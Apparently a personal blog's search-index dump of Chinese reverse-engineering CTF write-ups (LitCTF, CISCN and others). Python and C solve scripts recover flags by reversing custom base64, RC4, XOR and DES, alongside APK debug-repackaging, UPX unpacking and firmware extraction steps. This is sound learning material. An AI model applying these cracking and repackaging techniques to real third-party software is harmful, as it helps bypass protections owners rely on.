{"meta":{"title":"D3v3n's Blog","subtitle":"","description":"","author":"D3v3n","url":"https://d3v3nlxk.github.io","root":"/"},"pages":[{"title":"Gallery","date":"2024-05-07T14:47:31.000Z","updated":"2024-05-08T06:54:16.362Z","comments":true,"path":"Gallery/index.html","permalink":"https://d3v3nlxk.github.io/Gallery/index.html","excerpt":"","text":"南校之行 期末考完去南校的随拍"},{"title":"分类","date":"2024-04-11T07:12:59.000Z","updated":"2024-04-11T07:14:02.230Z","comments":true,"path":"categories/index.html","permalink":"https://d3v3nlxk.github.io/categories/index.html","excerpt":"","text":""},{"title":"关于","date":"2024-04-11T08:10:17.000Z","updated":"2024-04-15T12:41:54.637Z","comments":true,"path":"about/index.html","permalink":"https://d3v3nlxk.github.io/about/index.html","excerpt":"","text":"大二网络安全小菜鸡​ 从0开始的re和ai之旅"},{"title":"友情链接","date":"2024-04-11T07:43:09.000Z","updated":"2024-05-07T12:38:51.395Z","comments":true,"path":"link/index.html","permalink":"https://d3v3nlxk.github.io/link/index.html","excerpt":"","text":""},{"title":"标签","date":"2024-04-11T07:12:35.000Z","updated":"2024-04-11T07:15:03.514Z","comments":true,"path":"tags/index.html","permalink":"https://d3v3nlxk.github.io/tags/index.html","excerpt":"","text":""},{"title":"Videos","date":"2024-04-15T14:47:31.000Z","updated":"2024-05-07T16:18:38.591Z","comments":true,"path":"movies/index.html","permalink":"https://d3v3nlxk.github.io/movies/index.html","excerpt":"","text":"欢迎关注本人的b站账号哦，谢谢喵：董闻投稿视频-董闻视频分享-哔哩哔哩视频 (bilibili.com)"},{"title":"Music","date":"2024-04-15T14:47:31.000Z","updated":"2024-05-07T12:35:05.700Z","comments":true,"path":"music/index.html","permalink":"https://d3v3nlxk.github.io/music/index.html","excerpt":"","text":"中文歌 英文歌"},{"title":"南校之行","date":"2024-01-10T14:47:31.000Z","updated":"2024-05-08T06:56:33.368Z","comments":true,"path":"Gallery/南校之行/index.html","permalink":"https://d3v3nlxk.github.io/Gallery/%E5%8D%97%E6%A0%A1%E4%B9%8B%E8%A1%8C/index.html","excerpt":"","text":"[{\"url\":\"https://devenlxk.oss-cn-shenzhen.aliyuncs.com/img/202405080010018.jpg\",\"alt\":\"311A9706\"},{\"url\":\"https://devenlxk.oss-cn-shenzhen.aliyuncs.com/img/202405080011819.jpg\",\"alt\":\"311A9721\"},{\"url\":\"https://devenlxk.oss-cn-shenzhen.aliyuncs.com/img/202405080012356.jpg\",\"alt\":\"311A9734\"},{\"url\":\"https://devenlxk.oss-cn-shenzhen.aliyuncs.com/img/202405080012222.jpg\",\"alt\":\"311A9737\"},{\"url\":\"https://devenlxk.oss-cn-shenzhen.aliyuncs.com/img/202405080012112.jpg\",\"alt\":\"311A9744\"},{\"url\":\"https://devenlxk.oss-cn-shenzhen.aliyuncs.com/img/202405080013211.jpg\",\"alt\":\"311A9779\"},{\"url\":\"https://devenlxk.oss-cn-shenzhen.aliyuncs.com/img/202405080014127.jpg\",\"alt\":\"311A9800\"},{\"url\":\"https://devenlxk.oss-cn-shenzhen.aliyuncs.com/img/202405080014095.jpg\",\"alt\":\"311A9805\"}]"}],"posts":[{"title":"learning","slug":"learning","date":"2024-06-13T04:38:54.000Z","updated":"2024-06-13T06:59:53.099Z","comments":true,"path":"2024/06/13/learning/","permalink":"https://d3v3nlxk.github.io/2024/06/13/learning/","excerpt":"","text":"Day11、PE文件(portable executable)EXE : 这是一个可执行文件 ​ 文件值属性：010F(H) ​ 加载基址：0x00400000 DLL : 这是一个动态链接库文件，EXE 文件在运行时会调用 DLL 文件中的代码和资源 ​ 文件值属性：IMAGE_FILE_HEADER.Characteristics：210(H) ​ 加载基址：0x10000000 加载过程：调用CreateProcess启动，生产内核对象，分配4GB进程空间，系统加载器加载dll文件以及完成重定位, IAT, 接着创建进程的主线程，之后主线程为每个DLL调用_DLLMainCRTStartup函数，然后主线程根据 EXE是GUI（图形化）程序还是CUI（控制台）程序执行MainCRTStartup。最后一步执行WinMain(或者main函数):1、ReadFile读取文件头信息，判断是否是PE文件2、获取映像总大小，申请可读可写可执行的内存全部填为03、获取区段信息，循环读取每一个区段内容，将ReadFile读取的数据映射到内存中4、修复重定位5、修复IAT6、创建线程，线程回调指向OEP 2、基础知识","categories":[],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://d3v3nlxk.github.io/tags/reverse/"}]},{"title":"LitCTF","slug":"LitsCTF","date":"2024-06-01T13:56:11.000Z","updated":"2024-06-03T08:43:26.939Z","comments":true,"path":"2024/06/01/LitsCTF/","permalink":"https://d3v3nlxk.github.io/2024/06/01/LitsCTF/","excerpt":"","text":"挺简单的reverse，主要注重新的知识点，两道base64换表一道rc4还有一个upx套壳 编码喵123456789101112131415//main() std::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(refptr__ZSt3cin, v17); v11 = operator new(0x20ui64); text_72(v11);//换表abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/ v21 = v11; LODWORD(v11) = std::string::length(v17); v12 = (unsigned __int8 *)std::string::c_str(v17); LitCTF_tanji_calculate::Encode[abi:cxx11]((__int64)v16, v21, v12, v11);//base64加密 std::allocator&lt;char&gt;::allocator(&amp;v20); std::string::basic_string( (__int64)v15, (__int64)&quot;tgL0q1rgEZaZmdm0zwq4lweYzgeTngfHnI1ImMm5ltaXywnLowuYnJmWmx0=&quot;, (__int64)&amp;v20); if ( (unsigned __int8)std::operator==&lt;char&gt;(v16, v15) )//比较 v13 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((__int64)refptr__ZSt4cout, (__int64)&amp;unk_405208); 1234567891011121314151617181920import base64import string# 这是你的加密字符串和自定义的Base64字符集a = &#x27;tgL0q1rgEZaZmdm0zwq4lweYzgeTngfHnI1ImMm5ltaXywnLowuYnJmWmx0=&#x27;list1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&#x27;list2 = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;# 创建一个翻译表，将你的字符集映射到标准的Base64字符集trans = str.maketrans(list1, list2)# 使用这个翻译表将你的字符串转换为标准的Base64编码standard_b64 = a.translate(trans)# 现在你可以使用base64库来解码这个字符串了decoded_bytes = base64.b64decode(standard_b64)# 将解码后的字节串转换为字符串decoded_str = decoded_bytes.decode(&#x27;utf-8&#x27;)print(decoded_str)#LitCTF&#123;03034ed8-a2da-4aa6-b2c9-01ace9e26301&#125; hello_upx查壳发现无法正常脱除，查找文章发现不是常规upx壳，需要修改hex值然后upx正常去壳即可查看完整的反编译，可参考下面的文章。 https://blog.csdn.net/hanxuer_/article/details/106549548 123456789101112131415_main()： v4[0] = 0x707541504072684Ci64; v4[1] = 0x655158612559632Bi64; v4[2] = 0x4F5E4E601E5A4E20i64; v5 = 101; v7 = 1; printf(&quot;welcome to LitCTF2024\\nplease inputs you flag:&quot;); scanf(&quot;%s&quot;, v6); for ( i = 0; i &lt;= 24; ++i ) v6[i] -= i; for ( i = 0; i &lt;= 24; ++i ) &#123; if ( *((unsigned __int8 *)v4 + i) != v6[i] ) v7 = 0; &#125; 12345678a=[76, 104, 114, 64, 80, 65, 117, 112,43, 99, 89, 37, 97, 88, 81, 101,32, 78, 90, 30, 96, 78, 94, 79,101]b=&#x27;&#x27;for i in range(25): b+=chr(a[i]+i)print(b)#LitCTF&#123;w3lc0me_t0_l1tctf&#125; ezpython！！！！！使用 Pyinstaller Extractor 分离出pyc文件 1python pyinstxtractor.py ezpy.exe 在线网站反编译 123456789101112131415161718192021222324252627#ezpy.pyc#!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.11import Litctfbase64flag = input(&#x27;flag:&#x27;)flag = Litctfbase64.b64decode(flag)if flag == &#x27;X=3o4hx=0EZwf=mMv13gX=3o4hx=qje2ZjtgZQmEKXZog4==&#x27;: print(&#x27;win&#x27;) return Noneprint(&#x27;no&#x27;)#Litctfbase64# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information# Version : Python 3.11import stringBASE64_ALPHABET = &#x27;8kuWYm=1JiUPs7DT4x+X5tcqZKfGvA0gFLB6y3QbV2rNOlRdMwnEohjzSe9/HIa-&#x27;def b64decode(input_string): pass# WARNING: Decompyle incompletedef from_base64(base64_string): pass# WARNING: Decompyle incomplete 虽然代码不能完全反编译但是能够大致猜到就是逆向换表base64，但有一点他最后四位需要去掉才能正常decode 1234567891011121314151617181920import base64import string# 这是你的加密字符串和自定义的Base64字符集a = &#x27;X=3o4hx=0EZwf=mMv13gX=3o4hx=qje2ZjtgZQmEKXZo&#x27;list1 = &#x27;8kuWYm=1JiUPs7DT4x+X5tcqZKfGvA0gFLB6y3QbV2rNOlRdMwnEohjzSe9/HIa-&#x27;list2 = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;# 创建一个翻译表，将你的字符集映射到标准的Base64字符集trans = str.maketrans(list1, list2)# 使用这个翻译表将你的字符串转换为标准的Base64编码standard_b64 = a.translate(trans)# 现在你可以使用base64库来解码这个字符串了decoded_bytes = base64.b64decode(standard_b64)# 将解码后的字节串转换为字符串decoded_str = decoded_bytes.decode(&#x27;utf-8&#x27;)print(decoded_str)#LitCTF&#123;61happy_LitCTF_nice_base64&#125; ezrc4说是签到题结果到头来是解出人数最少的一道题，还被他绕了蛮久的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//main() Buf1[0] = 0x606EA290DC7CB2D5i64; Buf1[1] = 0x3190B05971E41306i64; printf(&quot;input flag:&quot;); scanf(&quot;%s21&quot;, Str); v3 = strlen(Str); v4 = strlen(key); rc4_init((__int64)v10, (__int64)key, v4); //key = &#x27;fenkey?&#x27;但是发现有交叉引用需要解出正确的key rc4_crypt((__int64)v10, Str, v3); if ( !memcmp(Buf1, Str, 0x15ui64) )//rc4_init()创建S盒 for ( i = 0i64; i != 256; ++i ) &#123; *(_BYTE *)(a1 + i) = i; v11[i] = *(_BYTE *)(a2 + (int)i % a3); &#125; v5 = 0i64; v6 = 0; do &#123; v7 = *(_BYTE *)(a1 + v5); v8 = v11[v5] + v6 + v7; // 下面这几步看起来很绕，实际上就是混淆用的，和正常创建效果一致 v9 = (unsigned int)(((unsigned __int8)v11[v5] + v6 + v7) &gt;&gt; 31) &gt;&gt; 24; v6 = (unsigned __int8)(v9 + v8) - v9; result = (unsigned __int8 *)(a1 + v6); *(_BYTE *)(a1 + v5) = *result; *result = v7; ++v5; &#125;//re4_crypt() if ( a3 &gt; 0 ) &#123; v3 = a2; v4 = &amp;a2[a3 - 1 + 1]; v5 = 0; v6 = 0; do &#123; v6 = (v6 + 1) % 256; v7 = (unsigned __int8 *)(a1 + v6); v8 = *v7; v9 = v5 + *v7; // 一样也是正常rc4加密 v10 = (unsigned int)((v5 + *v7) &gt;&gt; 31) &gt;&gt; 24; v5 = (unsigned __int8)(v10 + v9) - v10; v11 = (unsigned __int8 *)(a1 + v5); *v7 = *v11; *v11 = v8; result = *(unsigned __int8 *)(a1 + (unsigned __int8)(*v7 + v8)); *v3++ ^= result; &#125; while ( v3 != v4 ); &#125;//X_X() result = key; v1 = &amp;key1; do *result++ ^= *v1++; while ( result != &amp;key[7] ); return result; 123456789101112131415#求解key并且创建S盒a=&#x27;fenkey?&#x27;d=[10, 12, 26, 8, 17, 31, 30]e=&#x27;&#x27;for i in range(len(a)): e+=chr(ord(a[i])^d[i])b=&#x27;&#x27;c=[]j=0for i in range(256): c.append(i)for i in range(256): j = (j + c[i] + ord(e[i % len(a)])) % 256 # 这里把 C 实现中的 prc4-&gt;t_box[i] = key[i % keylen];和j=(j+prc4-&gt;s_box[i]+prc4-&gt;t_box[i])%256;合并在了一起。 c[i], c[j] = c[j], c[i]print(c) 12345678910111213141516171819#rc4解码a=[33, 214, 76, 178, 43, 149, 188, 179, 69, 9, 85, 77, 37, 169, 143, 27, 99, 147, 25, 146, 7, 72, 20, 91, 205, 133, 19, 157, 151, 11, 15, 35, 78, 41, 0, 210, 115, 123, 56, 48, 49, 196, 112, 42, 164, 158, 141, 107, 139, 2, 195, 106, 250, 241, 207, 28, 18, 54, 223, 167, 46, 74, 216, 60, 230, 62, 131, 113, 184, 160, 213, 51, 243, 159, 93, 198, 219, 45, 44, 168, 71, 220, 89, 232, 190, 36, 124, 142, 90, 130, 82, 233, 81, 154, 80, 126, 236, 118, 32, 129, 102, 181, 105, 165, 203, 251, 88, 127, 180, 40, 237, 249, 110, 248, 108, 23, 12, 109, 14, 201, 66, 94, 177, 152, 227, 185, 53, 128, 58, 104, 192, 103, 231, 65, 22, 182, 173, 120, 211, 70, 187, 95, 218, 34, 239, 97, 10, 55, 148, 26, 8, 21, 24, 194, 245, 242, 155, 156, 52, 206, 117, 162, 116, 191, 161, 125, 137, 183, 100, 3, 247, 208, 240, 132, 222, 200, 138, 96, 224, 6, 235, 255, 204, 193, 79, 170, 50, 59, 47, 145, 38, 1, 215, 144, 119, 87, 114, 92, 217, 176, 238, 134, 174, 31, 153, 150, 13, 226, 17, 252, 64, 98, 228, 186, 246, 166, 83, 16, 111, 57, 253, 84, 39, 136, 197, 172, 225, 212, 75, 101, 73, 202, 254, 61, 209, 86, 244, 68, 229, 5, 171, 163, 29, 63, 221, 121, 122, 189, 199, 67, 234, 4, 175, 135, 140, 30]c=[213, 178, 124, 220, 144, 162, 110, 96, 6, 19, 228, 113, 89, 176, 144, 49, 178, 199, 29, 215, 127]def rc4_decrypt(S, ciphertext): j = 0 out = [] i = j = 0 for char in ciphertext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = S[(S[i] + S[j]) % 256] out.append(char ^ k) return bytes(out)# 解密plaintext = rc4_decrypt(a, c)print(&quot;解密后的明文:&quot;, plaintext.decode(&quot;utf-8&quot;))#解密后的明文: LitCTF&#123;rc4_love_nice&#125; 总结还是有比较多的知识点不太熟悉，还得是多练题，多锻炼思维，才能做的又快有准","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://d3v3nlxk.github.io/tags/writeup/"}]},{"title":"2024\"磐石行动\"演练 Writeup","slug":"2024psctf","date":"2024-05-26T07:29:46.000Z","updated":"2024-05-30T10:43:52.587Z","comments":true,"path":"2024/05/26/2024psctf/","permalink":"https://d3v3nlxk.github.io/2024/05/26/2024psctf/","excerpt":"","text":"四象限守护者队 reverse 部分 WP“磐石行动”2024第二届全国高校网络安全攻防活动：CTF 个人排名15，团体排名17，总排35进入复赛。出了三道 re ，最简单的签到没做出来有点可惜了，这是我距离 ak 最近的一次了。然后就是学到了很多新的东西比如说固件逆向，虽然说有点公式化了但是还是蛮有难度的（好在加密都比较简单）。然后比较可惜的是数据安全通道一题未出，真会不了一点，太吃脑子了。 ezlogin简单des加密藏得很深，混淆的函数太多了有点难找，重点是找到key。这个软件不能debug权限不够，那就解包加权限，然后调试出key=’key_here’ 1、先反编译apk文件，删除原来的apk文件 1apktool d ezlogin.APK 2、给AndroidManifest.xml设置为debuggable 1android:debuggable=&quot;true&quot; 3、重新打包 1apktool b ezlogin 4、在dist文件夹找到新的apk，对文件进行对齐 1zipalign -p -f -v 4 ezlogin.apk ezlogin1.apk 5、进行重新签名 1apksigner sign --ks abc.keystore ezlogin1.apk 12345678910111213141516171819202122232425262728293031import base64from Crypto.Cipher import DESfrom Crypto.Util.Padding import unpaddef decrypt_des(ciphertext, key): try: # Convert the base64-encoded ciphertext to bytes ciphertext_bytes = base64.b64decode(ciphertext) # Create a DES cipher object with the provided key cipher = DES.new(key.encode(), DES.MODE_ECB) # Decrypt the ciphertext plaintext_bytes = cipher.decrypt(ciphertext_bytes) # Remove padding plaintext = unpad(plaintext_bytes, 8).decode(&#x27;utf-8&#x27;) return plaintext except Exception as e: raise RuntimeError(f&quot;Decryption error: &#123;e&#125;&quot;)# Example usageencrypted_string = &quot;yU4Ad3tEpSgTdmBJ5wDbUhZAeY+Lm3VobQEQLyck1lfhEJ+OKcyU10PMij+RGqus&quot;key = &#x27;key_here&#x27; # Replace with the actual keytry: decrypted_text = decrypt_des(encrypted_string, key) print(f&quot;Decrypted text: &#123;decrypted_text&#125;&quot;)except Exception as e: print(f&quot;Error: &#123;e&#125;&quot;)#Decrypted text: flag&#123;f3c826ec-8453-4b80-8f52-468e0f9e05bf&#125; easy_iot第一次做固件逆向题完全没有思路，参考这篇文章 IoT固件逆向入门-腾讯云开发者社区-腾讯云 1binwalk -e out.bin 用binwalk把固件分离出来，然后他说flag在最简单的文件里面我直接找bin然后是文件修改时间最晚的就只有bash，套了一层upx的壳，去掉然后放进ida反编译 123456a=[5, 15, 2, 4, 24, 54, 85, 47, 85, 39, 86, 85, 85, 34, 86, 58, 81, 53, 86, 86, 18, 38, 86, 57, 22,85, 86, 47, 22, 81, 85, 58, 32, 36, 86, 57, 32, 30]b=&#x27;&#x27;for i in a: b+=chr(i^0x63)print(b)#flag&#123;U6L6D566A5Y2V55qE5Zu65Lu26YCG5ZC&#125; easystm32第一次操作这种固件，参考文章： 【MCU】可怕，别人把我MCU固件给反汇编了！(逆向)-CSDN博客 按c反编译之后查看string可以发现提示是： 随后搜索有可能加密后的字符串： 加密方法： 解码就完事： 123456a=[0x66,0x6D,0x63,0x64,0x7f,0x57,0x37,0x4b,0x3c,0x7b,0x58,0x40,0x3a,0x70]b=&#x27;&#x27;for i in range(14): b+=chr(a[i]^i)print(b)#flag&#123;R1L4rRK6&#125; 再转成md5 今天天气怎么样第一部分包含两个函数一加密一比较：crazy()、ohh() 12345678910111213141516//crazy()for ( i = 0; i &lt;= 29; ++i ) &#123; v3 = &amp;a1[i]; if ( (i &amp; 1) != 0 ) a1[i] -= i; else a1[i] ^= i; &#125;//ohh()for ( i = 0; i &lt;= 29; ++i ) &#123; if ( a1[i] != v2[i] ) v3 = 0; &#125;//v2=[102, 107, 99, 100, 127, 99, 105, 112, 87, 96, 121, 84, 120, 91, 107, 80, 103, 84, 115, 97, 124, 80, 100, 72, 108, 86, 126, 70, 101, 96] 12345678910111213141516171819202122#include &lt;stdio.h&gt;void action3(int *str) &#123; for (int i = 0; i &lt; 30; ++i) &#123; if ((i &amp; 1) != 0) &#123; str[i] += i; &#125; else &#123; str[i] ^= i; &#125; &#125;&#125;int main() &#123; int a[] = &#123;102, 107, 99, 100, 127, 99, 105, 112, 87, 96, 121, 84, 120, 91, 107, 80, 103, 84, 115, 97, 124, 80, 100, 72, 108, 86, 126, 70, 101, 96&#125;; action3(a); for (int i = 0; i &lt; 30; ++i) &#123; printf(&quot;%c&quot;, a[i]); &#125; printf(&quot;\\n&quot;); return 0;&#125;//flag&#123;how_is_the_weather_today&#125; 然后发现后面还有一关，要调用my_function()，但是都是花指令和奇怪的跳转，打断点单步调试再create function就找到了实际调用逻辑。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556puts(&quot;please input your True flag:&quot;); scanf(&quot;%40s&quot;, Str); v7 = strlen(Str); if ( v7 != 30 ) &#123; puts(&quot;Wrong!&quot;); exit(0); &#125; qmemcpy(v4, &amp;unk_404040, sizeof(v4)); memset(v5, 0, sizeof(v5)); memset(v6, 0, sizeof(v6)); v2 = strlen(a2); xxx_init(v5, (unsigned __int8 *)a2, v2); for ( i = 0; i &lt;= 255; ++i ) v6[i] = v5[i]; xxx_crypt(v5, (unsigned __int8 *)Str, v7); v9 = 1; for ( j = 0; ; ++j ) &#123; if ( j &gt;= v7 ) goto LABEL_11; if ( (unsigned __int8)Str[j] != v4[j] ) break; &#125; v9 = 0;LABEL_11: if ( v9 ) puts(&quot;Good! have a beautiful day for you!&quot;); else puts(&quot;May be try again?&quot;);//xxx_crypt(rc4加密)unsigned int __cdecl xxx_crypt(unsigned __int8 *a1, unsigned __int8 *a2, unsigned int a3)&#123; unsigned int result; // eax unsigned __int8 v4; // [esp+Fh] [ebp-15h] unsigned int i; // [esp+14h] [ebp-10h] int v6; // [esp+18h] [ebp-Ch] int v7; // [esp+1Ch] [ebp-8h] v7 = 0; v6 = 0; for ( i = 0; ; ++i ) &#123; result = i; if ( i &gt;= a3 ) break; v7 = (v7 + 1) % 256; v6 = (v6 + a1[v7]) % 256; v4 = a1[v7]; a1[v7] = a1[v6]; a1[v6] = v4; a2[i] ^= a1[(unsigned __int8)(a1[v7] + a1[v6])]; &#125; return result;&#125; 单步调试得到s盒和最后要比对的值，rc4求解即可得出答案 12345678910111213141516171819a=[48, 114, 153, 160, 71, 163, 108, 200, 150, 187, 78, 151, 90, 7, 167, 38, 120, 18, 132, 216, 144, 9, 210, 249, 62, 52, 64, 73, 109, 29, 66, 125, 175, 119, 208, 47, 193, 138, 21, 159, 87, 241, 40, 218, 92, 234, 59, 91, 180, 99, 243, 121, 248, 148, 2, 55, 95, 220, 183, 178, 82, 0, 98, 12, 69, 36, 17, 237, 252, 165, 14, 31, 68, 113, 8, 254, 67, 37, 65, 177, 105, 42, 227, 129, 93, 209, 219, 147, 251, 10, 83, 238, 225, 70, 28, 253, 168, 236, 101, 89, 61, 201, 33, 191, 217, 128, 136, 23, 211, 231, 247, 145, 146, 112, 6, 80, 184, 197, 239, 255, 43, 134, 111, 97, 57, 81, 103, 11, 106, 172, 26, 1, 39, 226, 230, 215, 158, 53, 244, 50, 224, 35, 4, 152, 72, 164, 115, 58, 161, 126, 100, 117, 154, 46, 174, 79, 223, 214, 137, 186, 5, 24, 190, 22, 49, 235, 195, 162, 179, 60, 44, 203, 233, 245, 54, 74, 135, 156, 143, 204, 246, 140, 16, 124, 194, 171, 20, 88, 76, 181, 212, 77, 15, 188, 3, 166, 202, 142, 176, 30, 27, 206, 192, 213, 240, 221, 133, 189, 84, 96, 131, 110, 170, 141, 196, 222, 63, 242, 13, 45, 107, 155, 51, 198, 127, 94, 41, 34, 149, 205, 185, 182, 56, 250, 157, 139, 173, 123, 32, 232, 199, 116, 104, 75, 25, 122, 102, 207, 229, 118, 228, 169, 130, 19, 86, 85]b=&#x27;flag&#123;how_is_the_weather_today&#125;&#x27;c=[77, 216, 118, 45, 12, 38, 12, 83, 218, 192, 23, 55, 140, 215, 243, 217, 208, 70, 43, 21, 152, 103, 241, 173, 166, 14, 124, 102, 144, 127]def rc4_decrypt(S, ciphertext): j = 0 out = [] i = j = 0 for char in ciphertext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = S[(S[i] + S[j]) % 256] out.append(char ^ k) return bytes(out)# 解密plaintext = rc4_decrypt(a, c)print(&quot;解密后的明文:&quot;, plaintext.decode(&quot;utf-8&quot;))#解密后的明文: flag&#123;This_is_a_beautiful_day!&#125;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://d3v3nlxk.github.io/tags/writeup/"}]},{"title":"2024CISCN 初赛WP","slug":"2024CISCN WP","date":"2024-05-19T12:21:00.000Z","updated":"2024-05-20T09:18:27.719Z","comments":true,"path":"2024/05/19/2024CISCN WP/","permalink":"https://d3v3nlxk.github.io/2024/05/19/2024CISCN%20WP/","excerpt":"","text":"战队名称：四象限守护者 战队排名：356名 火锅链观光打卡下载一个metamask连接 androidso_re不知道为什么动态调试的key为什么总是出错，下次可以试试hook 123456789101112131415from base64 import b64decodefrom Crypto.Cipher import DESfrom Crypto.Util.Padding import unpaddef des_decrypt(ciphertext, key, iv): des = DES.new(key.encode(), DES.MODE_CBC, iv.encode()) plaintext = unpad(des.decrypt(b64decode(ciphertext)), DES.block_size) return plaintext.decode()ciphertext = &#x27;JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw==&#x27;key = &#x27;A8UdWaeq&#x27;iv = &#x27;Wf3DLups&#x27; # 你需要提供一个正确的 IVprint(des_decrypt(ciphertext, key, iv))#188cba3a5c0fbb2250b5a2e590c391ce asm_reai化简的汇编有一定的问题，大体上方向一致 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, const char **argv, const char **envp) &#123; char __src[] = &quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;; char __dst[0x98]; memcpy(__dst, __src, 0x98); int len = strlen(__dst); int i; for (i = 0; i &lt; len; i++) &#123; __dst[i] *= 0x50; __dst[i] += 0x14; __dst[i] ^= 0x4D; __dst[i] += 0x1E; &#125; printf(&quot;%s\\n&quot;, __dst); return 0;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647a=&#x27;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;b=[0x00001FD7, 0x000021B7, 0x00001E47, 0x00002027, 0x000026E7, 0x000010D7, 0x00001127, 0x00002007, 0x000011C7, 0x00001E47, 0x00001017, 0x00001017, 0x000011F7, 0x2007, 0x1037, 0x1107, 0x1F17, 0X10D7, 0X1017, 0X1017, 0X1F67, 0X1017, 0X11C7, 0X11C7, 0X1017, 0x00001FD7, 0x00001F17, 0x00001107, 0x00000F47, 0x00001127, 0x00001037, 0x1E47, 0X1037, 0x00001FD7, 0x00001107, 0x00001FD7, 0x00001107, 0x00002787]c=&#x27;&#x27;for i in b: c+=chr(int((((i-0X1E)^0x4D)-0x14)/0x50))print(c)print(len(a))#flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;#38 gdb_debug时间戳爆破 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;int main() &#123; int a; char j[39]=&quot;flag&#123;11111111111111111111111111111111&#125;&quot;; int d[5]=&#123;1, 184, 64, 189, 156&#125;; int k[38],b[38],c[38]; for (unsigned int i = 0; i &lt;= 0xF; ++i) &#123; unsigned int address = i &lt;&lt; 28; // Shift the value of &#x27;i&#x27; left by 28 bits srand(address &amp; 0xF0000000); printf(&quot;%x\\n&quot;,address); for(int i=0;i&lt;38;i++) &#123; a = rand(); k[i]=a^j[i]; printf(&quot;%x,&quot;,a&amp;0xFF); &#125; printf(&quot;\\n&quot;); for(int i=0;i&lt;38;i++) &#123; b[i]=i; &#125; for ( int i = 37; i; --i ) &#123; a=rand() % (i + 1); int temp; temp=b[i]; b[i]=b[a]; b[a]=temp; &#125; for(int i=0;i&lt;38;i++) &#123; c[i]=k[b[i]]; printf(&quot;%d,&quot;,b[i]); &#125; printf(&quot;\\n&quot;); for(int i=0;i&lt;38;i++) &#123; int temp=c[i]; //c[i]=rand()^temp; printf(&quot;%x,&quot;,rand()&amp;0xFF); &#125; printf(&quot;\\n&quot;); &#125; return 0;&#125;/*-------------0------------67,c6,69,73,51,ff,4a,ec,29,cd,ba,ab,f2,fb,e3,46,7c,c2,54,f8,1b,e8,e7,8d,76,5a,2e,63,33,9f,c9,9a,66,32,d,b7,31,58,7,12,37,27,16,10,14,15,3,22,28,29,11,17,0,31,5,36,4,2,9,34,6,35,25,1,21,32,20,8,26,24,23,19,18,33,30,13,97,ea,dc,6b,96,8f,38,5c,2a,ec,b0,3b,fb,32,af,3c,54,ec,18,db,5c,2,1a,fe,43,fb,fa,aa,3a,fb,29,d1,e6,5,3c,7c,94,75,-------------10000000------------62,7b,47,a6,ca,da,5d,f,49,bc,7f,23,36,25,dd,1f,11,50,d1,4,6d,34,99,83,39,35,59,f5,e,b4,c,70,2f,54,17,f9,2e,74,37,16,1,14,21,11,24,4,23,22,28,2,10,27,12,20,0,7,26,9,6,18,15,19,5,31,25,32,3,8,30,33,36,35,17,13,29,34,2c,d4,ba,eb,9d,11,ae,d2,9d,a,8b,61,9c,9d,1b,3c,63,e1,4c,58,fb,74,46,43,10,3d,4,dd,bc,60,11,e9,34,cb,d4,d1,dc,82,-------------20000000------------7e,61,7e,8e,41,2a,2d,2b,a6,5c,a,ee,ab,69,f3,86,dc,f6,43,b6,f8,40,ba,44,e9,93,f6,e5,f,6f,3b,8d,d1,b9,1b,12,e3,48,16,3,17,34,11,12,6,32,7,19,5,27,9,33,23,21,14,28,24,10,31,26,25,29,15,35,36,22,0,1,30,37,13,2,8,20,4,18,20,6e,5c,ae,d0,75,f3,2a,ce,f2,c8,11,84,5d,39,26,61,9c,54,36,b8,9e,1d,b7,31,43,41,68,b1,43,ee,d1,b1,4a,7f,81,bf,72,-------------30000000------------df,b9,30,b6,12,aa,b9,3c,7d,88,3d,47,76,1e,eb,bc,1d,63,65,d0,8,9c,8b,62,70,ff,d6,dc,b2,2c,17,91,e5,48,47,f7,f2,1,23,7,0,14,30,27,28,22,33,4,8,9,37,2,35,17,10,18,3,29,32,6,15,34,11,1,21,25,20,24,13,16,31,19,36,5,26,12,85,24,d7,32,29,f8,af,37,b5,b7,a8,e2,be,ee,ec,77,61,d,c2,ba,76,54,a,d1,e7,8e,9c,3,83,1e,1e,9,42,f6,3b,6c,ee,eb,-------------40000000------------d3,47,e7,32,21,10,39,3c,2c,b0,75,b3,60,b2,a3,fb,7e,97,ec,9e,e6,fc,f0,72,36,52,f3,53,6a,3e,9c,3e,85,83,70,a7,94,a9,32,33,37,20,2,0,14,16,18,5,1,35,12,25,28,8,4,30,3,29,31,22,27,21,10,26,15,6,36,23,7,11,19,9,24,34,13,17,ad,25,f5,36,d3,96,5e,67,34,75,6e,7,df,68,2e,b4,a0,f1,c6,5e,38,49,c3,12,76,c,ad,fc,ad,bb,3d,5a,e0,32,91,b3,c9,ef,-------------50000000------------fe,64,d0,df,4c,8f,d7,2a,8a,2b,43,37,b,ac,9a,64,e7,46,8c,1f,89,b4,f6,b1,58,6,b6,75,90,da,7e,8f,3e,4e,6